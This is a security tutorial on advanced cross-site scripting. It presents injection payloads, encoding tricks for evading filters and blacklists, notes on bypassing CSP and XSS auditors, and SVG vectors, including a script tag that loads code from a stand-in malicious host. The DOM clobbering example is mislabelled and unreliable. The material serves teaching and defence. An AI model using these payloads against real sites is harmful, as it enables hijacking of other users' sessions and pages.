<h1 aligin="center"> Advanced XSS</h1>


# Advanced XSS

**Author:** Karthik S Sathyan  
**Based on:** Nicolas Golubovic's *Advanced XSS*  
**Date:** 20 October 2024  
**Description:** This project provides an in-depth explanation of advanced Cross-Site Scripting (XSS) techniques, including bypassing modern web security mechanisms like blacklists, filters, and Content Security Policy (CSP). It covers strategies for evading XSS defenses and executing scripts through various vectors, including DOM-based XSS, charset sniffing, and more.

---

## Table of Contents

- [Introduction](#introduction)
- [Fundamentals of XSS](#fundamentals-of-xss)
  - [Script Tag Injection](#script-tag-injection)
  - [Event Handlers](#event-handlers)
  - [Pseudo-Handlers](#pseudo-handlers)
  - [Eval and Similar Functions](#eval-and-similar-functions)
- [XSS Attack Vectors](#xss-attack-vectors)
  - [Reflected XSS](#reflected-xss)
  - [Persistent XSS](#persistent-xss)
  - [DOM-based XSS](#dom-based-xss)
- [Bypassing Filters and Blacklists](#bypassing-filters-and-blacklists)
  - [Using Encodings](#using-encodings)
  - [URL Encoding Tricks](#url-encoding-tricks)
  - [Hexadecimal Escaping](#hexadecimal-escaping)
- [Content Sniffing](#content-sniffing)
- [Defensive Mechanisms](#defensive-mechanisms)
  - [httpOnly Cookies](#httponly-cookies)
  - [Content Security Policy (CSP)](#content-security-policy-csp)
  - [XSS Auditors](#xss-auditors)
- [Tips, Tricks, and Advanced Techniques](#tips-tricks-and-advanced-techniques)
  - [DOM Clobbering](#dom-clobbering)
  - [XSS in SVGs](#xss-in-svgs)
- [Conclusion](#conclusion)
- [Resources](#resources)

---

## Introduction

Cross-Site Scripting (XSS) vulnerabilities occur when untrusted user input is executed as code in a web browser. This project details **advanced techniques** to bypass security measures such as blacklists, browser filters, and even **Content Security Policies (CSPs)**. It covers DOM-based XSS, content sniffing, and provides tips for persistent attacks.

---

## Fundamentals of XSS

Cross-Site Scripting (XSS) exploits browser vulnerabilities and insecure handling of user data. Some typical methods of executing XSS attacks are:

### Script Tag Injection

Injecting malicious JavaScript code using `<script>` tags:

```html
<script>alert('XSS');</script>
```

Or by sourcing external scripts:

```html
<script src=//example.com/malicious.js></script>
```

### Event Handlers

Attackers can trigger JavaScript via event handlers, such as `onload`, `onerror`, or `onfocus`.

```html
<svg onload=alert(1)></svg>
<img src=x onerror=alert(1)>
```

### Pseudo-Handlers

Pseudo-handlers allow scripts to execute in URLs or other elements without an explicit event handler.

```html
<a href="javascript:alert(1)">Click me</a>
```

```html
<iframe src="javascript:alert(1)"></iframe>
```

### Eval and Similar Functions

Functions like `eval()`, `setTimeout()`, and CSS expressions allow code execution:

```javascript
eval('alert(1)');
setTimeout('alert(1)', 0);
```

---

## XSS Attack Vectors

XSS can be categorized based on how the payload is delivered and executed:

### Reflected XSS

This occurs when user input is immediately reflected in the server's response, often in a query string or form field, making it easy for attackers to inject malicious scripts.

### Persistent XSS

Here, malicious scripts are stored on the server and then served to users, such as through user-generated content on forums or blogs.

### DOM-based XSS

DOM-based XSS attacks are executed purely on the client-side. The malicious input is embedded in the page’s DOM and executed without server interaction:

```javascript
document.write(location.hash);
```

---

## Bypassing Filters and Blacklists

Modern web applications use **blacklists** and **filters** to prevent XSS attacks, but these can often be bypassed through creative techniques like encoding or using browser quirks.

### Using Encodings

Obfuscating malicious scripts using HTML entities or Unicode can bypass filters:

```html
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74:alert(1);
```

### URL Encoding Tricks

URL encoding replaces characters with their ASCII values in hex:

```html
javascript%3Aalert%281%29
```

### Hexadecimal Escaping

Using Unicode escape sequences or hexadecimal encoding can bypass strict filters:

```html
\u0061\u006c\u0065\u0072\u0074(1); // alert(1)
```

---

## Content Sniffing

Browsers often attempt to interpret untrusted content as valid HTML, even when no proper MIME type is provided. **Content sniffing** exploits this behavior:

- MIME-type `unknown/unknown` or `application/unknown` can lead to XSS.
- Browsers like **IE** and **Chrome** are susceptible to content sniffing without proper headers like `X-Content-Type-Options: nosniff`.

---

## Defensive Mechanisms

While XSS is a prevalent threat, modern defenses are in place to mitigate attacks. However, these defenses are not foolproof.

### httpOnly Cookies

Cookies marked as `httpOnly` cannot be accessed via JavaScript. This prevents XSS from stealing session cookies. However, they are not invulnerable.

### Content Security Policy (CSP)

CSP is a modern approach to prevent XSS by specifying allowed sources for scripts, styles, and other content. While effective, CSPs can be bypassed with **JSONP** or creative use of legitimate script inclusions.

### XSS Auditors

Browsers like **Chrome** feature XSS filters, which block reflected XSS by comparing input with the URL and sanitizing the response. These filters, however, can be bypassed with slight variations in the payload.

---

## Tips, Tricks, and Advanced Techniques

### DOM Clobbering

DOM clobbering abuses how JavaScript references DOM elements via their names. Attackers can create elements named after JavaScript methods to overwrite or "clobber" functionality.

```html
<form name="querySelector"></form>
<script>
  document.querySelector = function() { alert('Clobbered!'); };
</script>
```

### XSS in SVGs

SVGs are a rich source for executing XSS due to their support for inline JavaScript.

```html
<svg><script>alert(1)</script></svg>
```

Further obfuscation techniques within SVGs can evade filters:

```html
<svg><script>a<!>l<!>e<!>r<!>t(1)</script></svg>
```

---

## Conclusion

Cross-Site Scripting continues to be a prevalent web vulnerability despite modern defenses. By understanding advanced XSS techniques and how to bypass common protections like CSPs, filters, and browsers' XSS Auditors, developers and security professionals can better secure applications.

---

## Resources

- **Michal Zalewski**: [The Tangled Web](http://lcamtuf.coredump.cx)
- **Mario Heiderich**: [html5sec](http://html5sec.org)
- **Gareth Heyes**: [The Spanner](http://thespanner.co.uk)
- **Kotowicz**: [blog.kotowicz.net](http://blog.kotowicz.net)
